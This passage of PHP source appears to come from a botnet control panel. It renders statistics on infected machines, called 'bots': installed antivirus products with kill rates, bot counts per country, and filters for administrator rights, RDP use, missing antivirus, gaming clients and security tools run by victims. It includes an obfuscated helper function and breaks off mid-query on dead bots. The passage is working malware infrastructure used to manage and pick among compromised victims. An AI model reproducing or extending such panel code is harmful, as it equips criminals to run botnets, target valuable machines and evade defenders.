    echo "<tr><td style=\"border: hidden;\">Avira</td><td style=\"border: hidden;\">" . $Num_Avs_Avira . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_Avira, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_Avira . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_Avira, $Num_Avs_Avira) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">ESET</td><td style=\"border: hidden;\">" . $Num_Avs_ESET . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_ESET, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_ESET . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_ESET, $Num_Avs_ESET) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">McAfee</td><td style=\"border: hidden;\">" . $Num_Avs_McAfee . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_McAfee, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_McAfee . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_McAfee, $Num_Avs_McAfee) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">Trend Micro</td><td style=\"border: hidden;\">" . $Num_Avs_TrendMicro . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_TrendMicro, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_TrendMicro . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_TrendMicro, $Num_Avs_TrendMicro) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">Avast!</td><td style=\"border: hidden;\">" . $Num_Avs_Avast . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_Avast, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_Avast . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_Avast, $Num_Avs_Avast) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">BitDefender</td><td style=\"border: hidden;\">" . $Num_Avs_BitDefender . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_BitDefender, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_BitDefender . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_BitDefender, $Num_Avs_BitDefender) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">Microsoft Security Essentials</td><td style=\"border: hidden;\">" . $Num_Avs_MSSE . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_MSSE, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_MSSE . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_MSSE, $Num_Avs_MSSE) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">MalwareBytes Pro</td><td style=\"border: hidden;\">" . $Num_Avs_MalwareBytes . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_MalwareBytes, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_MalwareBytes . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_MalwareBytes, $Num_Avs_MalwareBytes) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">BullGuard</td><td style=\"border: hidden;\">" . $Num_Avs_BullGuard . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_BullGuard, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_BullGuard . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_BullGuard, $Num_Avs_BullGuard) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">Rising</td><td style=\"border: hidden;\">" . $Num_Avs_Rising . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_Rising, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_Rising . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_Rising, $Num_Avs_Rising) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">ArcaVir</td><td style=\"border: hidden;\">" . $Num_Avs_ArcaVir . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_ArcaVir, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_ArcaVir . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_ArcaVir, $Num_Avs_ArcaVir) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">Webroot SecureAnywhere</td><td style=\"border: hidden;\">" . $Num_Avs_Webroot . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_Webroot, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_Webroot . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_Webroot, $Num_Avs_Webroot) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">Emsisoft</td><td style=\"border: hidden;\">" . $Num_Avs_Emsisoft . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_Emsisoft, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_Emsisoft . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_Emsisoft, $Num_Avs_Emsisoft) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">F-Secure</td><td style=\"border: hidden;\">" . $Num_Avs_FSecure . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_FSecure, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_FSecure . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_FSecure, $Num_Avs_FSecure) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">Panda Free/Paid</td><td style=\"border: hidden;\">" . $Num_Avs_Panda . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_Panda, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_Panda . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_Panda, $Num_Avs_Panda) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">PC Tools</td><td style=\"border: hidden;\">" . $Num_Avs_PcTools . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_PcTools, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_PcTools . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_PcTools, $Num_Avs_PcTools) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">GData</td><td style=\"border: hidden;\">" . $Num_Avs_GData . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_GData, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_GData . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_GData, $Num_Avs_GData) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">ZoneAlarm</td><td style=\"border: hidden;\">" . $Num_Avs_ZoneAlarm . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_ZoneAlarm, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_ZoneAlarm . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_ZoneAlarm, $Num_Avs_ZoneAlarm) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">Dr Web AV</td><td style=\"border: hidden;\">" . $Num_Avs_DrWeb . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_DrWeb, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_DrWeb . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_DrWeb, $Num_Avs_DrWeb) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">Sophos Endpoint</td><td style=\"border: hidden;\">" . $Num_Avs_SophosEndpoint . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_SophosEndpoint, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_SophosEndpoint . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_SophosEndpoint, $Num_Avs_SophosEndpoint) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">Ahnlab V3 Lite</td><td style=\"border: hidden;\">" . $Num_Avs_AhnlabV3 . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_AhnlabV3, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_AhnlabV3 . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_AhnlabV3, $Num_Avs_AhnlabV3) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">Baidu AntiVirus</td><td style=\"border: hidden;\">" . $Num_Avs_BaiduFree . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_BaiduFree, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_BaiduFree . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_BaiduFree, $Num_Avs_BaiduFree) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">BKav (VT)</td><td style=\"border: hidden;\">" . $Num_Avs_BKav . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_BKav, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_BKav . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_BKav, $Num_Avs_BKav) . "%)</td></tr>";
    echo "<tr><td style=\"border: hidden;\">GBuster Defense (BR)</td><td style=\"border: hidden;\">" . $Num_Avs_Gbuster . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Avs_Gbuster, $total_bots) . "%) &nbsp;<strong>//</strong> KIA: " . $Num_AvsKilled_Gbuster . " (" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AvsKilled_Gbuster, $Num_Avs_Gbuster) . "%)</td></tr>";
    echo "</tbody></table>\t\t\t\t\t\t</td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</tbody>\r\n\t\t\t</table>\r\n\t\t</td>\r\n\t</tr>\r\n</table>\r\n\r\n<br />\r\n\r\n<table class=\"table-condensed\" cellpadding=\"10\" width=\"760\" style=\"font-size: 10px; face: font-family: Tahoma;\">\r\n\t<tr>\r\n\t\t<td><strong><font size=\"2\">Country / Filter statistics</font></strong></td>\r\n\t</tr>\r\n\t<tr>\r\n\t\t<td valign=\"top\">\r\n\t\t\t<table style=\"border: hidden;\">\r\n\t\t\t\t<thead>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<th width=\"50%\"></th>\r\n\t\t\t\t\t\t<th width=\"50%\"></th>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</thead>\r\n\t\t\t\t<tbody>\r\n\t\t\t\t\t<tr>\r\n\t\t\t\t\t\t<td style=\"border: hidden;\" valign=\"top\">\r\n\t\t\t\t\t\t";
    $active_country_count = 0;
    $total_bots_not_dead = $sqlBots->Stats_GetTotalBots($s_current_group);
    if ($sql_countries && 0 < $sql_countries_count) {
        echo "<table><thead><tr><th width=\"320\"></th><th width=\"100\"></th></tr></thead><tbody>";
        for ($i = 0; $i < $sql_countries_count; $i++) {
            if ($sql_row = mysql_fetch_assoc($sql_countries)) {
                $sql_count_by_cn = $sqlStats->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE Locale = '" . $sql_row["COUNTRY_CODE2"] . "' " . $s_extended_query);
                if ($sql_count_by_cn) {
                    list($stat_count) = mysql_fetch_row($sql_count_by_cn);
                    if (0 < (int) $stat_count) {
                        echo "<tr><td style=\"border: hidden;\">";
                        echo $sql_row["COUNTRY_NAME"];
                        echo "</td><td style=\"border: hidden;\">" . (int) $stat_count . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($stat_count, $total_bots_not_dead) . "%)";
                        echo "</td></tr>";
                        $active_country_count++;
                    }
                    mysql_free_result($sql_count_by_cn);
                }
            }
        }
        if ($active_country_count == 0) {
            echo "<tr><td style=\"border: hidden;\">N/A</td><td style=\"border: hidden;\"></td></tr>";
        }
        echo "</tbody></table>";
    }
    echo "\t\t\t\t\t</td>\r\n\t\t\t\t\t<td style=\"border: hidden;\" valign=\"top\">\r\n\t\t\t\t\t\t";
    $active_country_count = 0;
    echo "<table><thead><tr><th width=\"320\"></th><th width=\"100\"></th></tr></thead><tbody><tr><td style=\"border: hidden;\">Using .NET framework 2.0 or greater";
    echo "</td><td style=\"border: hidden;\">" . (int) $flt_stat_dotnet . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($flt_stat_dotnet, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Has used RDP at some point";
    echo "</td><td style=\"border: hidden;\">" . (int) $flt_stat_rdp . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($flt_stat_rdp, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Has administrator privileges";
    echo "</td><td style=\"border: hidden;\">" . (int) $flt_stat_is_admin . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($flt_stat_is_admin, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Has connected a Samsung device before";
    echo "</td><td style=\"border: hidden;\">" . (int) $flt_stat_samsung . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($flt_stat_samsung, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Has connected a Apple device before";
    echo "</td><td style=\"border: hidden;\">" . (int) $flt_stat_apple . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($flt_stat_apple, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Has no <strong>detectable</strong> antivirus";
    echo "</td><td style=\"border: hidden;\">" . (int) $flt_stat_noav . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($flt_stat_noav, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Has Java";
    echo "</td><td style=\"border: hidden;\">" . (int) $flt_stat_java . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($flt_stat_java, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Has Skype";
    echo "</td><td style=\"border: hidden;\">" . (int) $flt_stat_skype . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($flt_stat_skype, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Has some version of Visual Studio";
    echo "</td><td style=\"border: hidden;\">" . (int) $flt_stat_visualstudio . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($flt_stat_visualstudio, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Has VMPlayer and/or VMWorkstation";
    echo "</td><td style=\"border: hidden;\">" . (int) $flt_stat_vmsoft . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($flt_stat_vmsoft, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Has Origin gaming client";
    echo "</td><td style=\"border: hidden;\">" . (int) $flt_stat_origin . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($flt_stat_origin, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Has Steam gaming client";
    echo "</td><td style=\"border: hidden;\">" . (int) $flt_stat_steam . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($flt_stat_steam, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Has Blizzard gaming client/service";
    echo "</td><td style=\"border: hidden;\">" . (int) $flt_stat_blizzard . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($flt_stat_blizzard, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Has League of Legends";
    echo "</td><td style=\"border: hidden;\">" . (int) $flt_stat_lol . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($flt_stat_lol, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Has RuneScape";
    echo "</td><td style=\"border: hidden;\">" . (int) $flt_stat_runescape . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($flt_stat_runescape, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Has Minecraft";
    echo "</td><td style=\"border: hidden;\">" . (int) $flt_stat_minecraft . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($flt_stat_minecraft, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\"></td><td style=\"border: hidden;\"></td></tr><tr><td style=\"border: hidden;\"><strong>Security tools that ran at least once</strong></td><td style=\"border: hidden;\"></td></tr><tr><td style=\"border: hidden;\">AdwCleaner";
    echo "</td><td style=\"border: hidden;\">" . (int) $Num_AdwCleaner . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_AdwCleaner, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">ComboFix";
    echo "</td><td style=\"border: hidden;\">" . (int) $Num_Combofix . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Combofix, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Adaware";
    echo "</td><td style=\"border: hidden;\">" . (int) $Num_Adaware . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Adaware, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Spybot Search And Destroy";
    echo "</td><td style=\"border: hidden;\">" . (int) $Num_SpybotSearchAndDestroy . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_SpybotSearchAndDestroy, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">BankerFix";
    echo "</td><td style=\"border: hidden;\">" . (int) $Num_Bankerfix . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_Bankerfix, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">TrendMicro HouseCall";
    echo "</td><td style=\"border: hidden;\">" . (int) $Num_HouseCall . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_HouseCall, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">HijackThis";
    echo "</td><td style=\"border: hidden;\">" . (int) $Num_HijackThis . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_HijackThis, $total_bots) . "%)";
    echo "</td></tr><tr><td style=\"border: hidden;\">Trusteer Rapport";
    echo "</td><td style=\"border: hidden;\">" . (int) $Num_TrusteerRapport . " &nbsp;(" . _obfuscated_0D3D322402062B2E21062726340734331F3F0B08103332_($Num_TrusteerRapport, $total_bots) . "%)";
    echo "</td></tr></tbody></table>\t\t\t\t\t</td>\r\n\t\t\t\t</tr>\r\n\t\t\t\t\r\n\t\t\t</table>\r\n\t\t\t\r\n\t\t</td>\r\n\t</tr>\r\n</table>\r\n\r\n</td>\r\n<td width=\"80%\" valign=\"top\">\r\n\r\n";
    $total_no_bots_item = $total_bots == 0 ? "['No bots signed up', 1]," : "";
    echo "\r\n<!-- OS Versions -->\r\n\r\n<div id=\"os_chart\" style=\"position: relative; left: 125px; height:460px; width:560px; font-size: 14px; face: font-family: Tahoma;\"></div>\r\n\r\n\r\n<script>\r\n\$(document).ready(function(){\r\n  var data = [\r\n\t";
    echo $total_no_bots_item;
    echo "    ['Windows XP', ";
    echo $Num_Windows_XP;
    echo "],['Windows Vista', ";
    echo $Num_Windows_Vista;
    echo "], ['Windows 7', ";
    echo $Num_Windows7;
    echo "], \r\n    ['Windows 8', ";
    echo $Num_Windows8;
    echo "],['Windows 8.1', ";
    echo $Num_Windows81;
    echo "],['Windows 10', ";
    echo $Num_Windows10;
    echo "],['Windows Server 2003', ";
    echo $Num_Windows_Server_2003;
    echo "], ['Windows Server 2008&nbsp;&nbsp;&nbsp;', ";
    echo $Num_Windows_Server_2008;
    echo "]\r\n  ];\r\n  var plot1 = jQuery.jqplot ('os_chart', [data], \r\n    { \r\n      grid: {\r\n\t\t    drawBorder: false, \r\n            drawGridlines: false,\r\n            background: '#ffffff',\r\n            shadow:false\r\n      },\r\nhighlighter: {\r\n    show:true,\r\n    tooltipLocation: 'n',\r\n    tooltipAxes: 'pieref', // exclusive to this version\r\n    tooltipAxisX: 20, // exclusive to this version\r\n    tooltipAxisY: 20, // exclusive to this version\r\n    useAxesFormatters: false,\r\n    formatString:'%s - %P bots',\r\n},\r\n      seriesDefaults: {\r\n        // Make this a pie chart.\r\n        renderer: jQuery.jqplot.PieRenderer, \r\n        rendererOptions: {\r\n          // Put data labels on the pie slices.\r\n          // By default, labels show the percentage of the slice.\r\n          showDataLabels: true\r\n        }\r\n\r\n      }, \r\n      legend: { show:true, location: 'e', drawBorder: false }\r\n    }\r\n  );\r\n});\r\n</script>\r\n\r\n<br />\r\n<br />\r\n<br />\r\n<br />\r\n<br />\r\n\r\n<!-- AVs Installed -->\r\n\r\n<div id=\"av_chart\" style=\"position: relative; top: 35px; left: 135px; height:460px; width:560px; font-size: 14px; face: font-family: Tahoma;\"></div>\r\n\r\n\r\n<script>\r\n\$(document).ready(function(){\r\n  var data = [\r\n\t";
    echo $total_no_bots_item;
    echo "    ['No Major AntiVirus', ";
    echo $Num_Avs_NoAV;
    echo "],['Norton', ";
    echo $Num_Avs_Norton;
    echo "], ['Kaspersky', ";
    echo $Num_Avs_Kaspersky;
    echo "], \r\n    ['AVG', ";
    echo $Num_Avs_AVG;
    echo "],['Avira', ";
    echo $Num_Avs_Avira;
    echo "], ['ESET', ";
    echo $Num_Avs_ESET;
    echo "],\r\n\t['McAfee', ";
    echo $Num_Avs_McAfee;
    echo "],['Trend Micro', ";
    echo $Num_Avs_TrendMicro;
    echo "], ['Avast!', ";
    echo $Num_Avs_Avast;
    echo "], ['BitDefender', ";
    echo $Num_Avs_BitDefender;
    echo "],\r\n\t['Microsoft Security Essentials&nbsp;&nbsp;&nbsp;', ";
    echo $Num_Avs_MSSE;
    echo "],['MalwareBytes Pro', ";
    echo $Num_Avs_MalwareBytes;
    echo "], ['BullGuard', ";
    echo $Num_Avs_BullGuard;
    echo "], ['Rising', ";
    echo $Num_Avs_Rising;
    echo "],\r\n\t['ArcaVir', ";
    echo $Num_Avs_ArcaVir;
    echo "],['Webroot SecureAnywhere', ";
    echo $Num_Avs_Webroot;
    echo "], ['Emsisoft', ";
    echo $Num_Avs_Emsisoft;
    echo "],\r\n\t['F-Secure', ";
    echo $Num_Avs_FSecure;
    echo "],['Panda', ";
    echo $Num_Avs_Panda;
    echo "], ['PC Tools', ";
    echo $Num_Avs_PcTools;
    echo "],\r\n\t['GData', ";
    echo $Num_Avs_GData;
    echo "],['ZoneAlarm', ";
    echo $Num_Avs_ZoneAlarm;
    echo "], ['BKav (VT)', ";
    echo $Num_Avs_BKav;
    echo "],\r\n\t['GBuster (BR)', ";
    echo $Num_Avs_Gbuster;
    echo "], ['Dr Web', ";
    echo $Num_Avs_DrWeb;
    echo "], ['Sophos Endpoint', ";
    echo $Num_Avs_SophosEndpoint;
    echo "], ['Ahnlab V3 Lite', ";
    echo $Num_Avs_AhnlabV3;
    echo "], ['Baidu AntiVirus', ";
    echo $Num_Avs_BaiduFree;
    echo "]\r\n  ];\r\n  var plot1 = jQuery.jqplot ('av_chart', [data], \r\n    { \r\n      grid: {\r\n\t\t    drawBorder: false, \r\n            drawGridlines: false,\r\n            background: '#ffffff',\r\n            shadow:false\r\n      },\r\nhighlighter: {\r\n    show:true,\r\n    tooltipLocation: 'n',\r\n    tooltipAxes: 'pieref', // exclusive to this version\r\n    tooltipAxisX: 20, // exclusive to this version\r\n    tooltipAxisY: 20, // exclusive to this version\r\n    useAxesFormatters: false,\r\n    formatString:'%s - %P bots',\r\n},\r\n      seriesDefaults: {\r\n        // Make this a pie chart.\r\n        renderer: jQuery.jqplot.PieRenderer, \r\n        rendererOptions: {\r\n          // Put data labels on the pie slices.\r\n          // By default, labels show the percentage of the slice.\r\n          showDataLabels: true\r\n        }\r\n\r\n      }, \r\n      legend: { show:true, location: 'e', drawBorder: false }\r\n    }\r\n  );\r\n});\r\n</script>\r\n\r\n</td>\r\n</tr>\r\n</table>\r\n\r\n";
} else {
    echo "\r\n<table cellpadding=\"10\"  align=\"left\" width=\"1740\" style=\"font-size: 10px; face: font-family: Tahoma;\">\r\n\t<tr>\r\n\t\t<td>\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\t\t\t<span style=\"position: relative; top: 35px; left: 184px;\">\r\n\t\t\t\t<strong><font style=\"font-size: 14px;\">Dead bot statistics (by AV)</font></strong>\r\n\t\t\t</span>\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\t\t\t<div id=\"chart1\" style=\"position: relative; top: 35px; left: 184px; height:420px; width:1730px; font-size: 14px; face: font-family: Tahoma;\"></div>\r\n\t\t\t<br />\r\n\t\t\t<br />\r\n\t\t</td>\r\n\t</tr>\r\n</table>\r\n\r\n\r\n";
    $squery = "SELECT\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled = 0) AS 'NO_AV',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00000001) AS 'NORTON',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00000002) AS 'KAS',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00000004) AS 'AVG',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00000008) AS 'AVIRA',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00000010) AS 'ESET',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00000020) AS 'MCAFEE',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00000040) AS 'TREND_MICRO',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00000080) AS 'AVAST',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR ClientStatus=" . BOT_STATUS_DEAD . ") AND AvsInstalled & 0x00000100) AS 'MSE',\r\n\t\t\t\t(SELECT COUNT(clients.id) FROM " . SQL_DATABASE . ".clients WHERE (ClientStatus=" . BOT_STATUS_DELETED . " OR 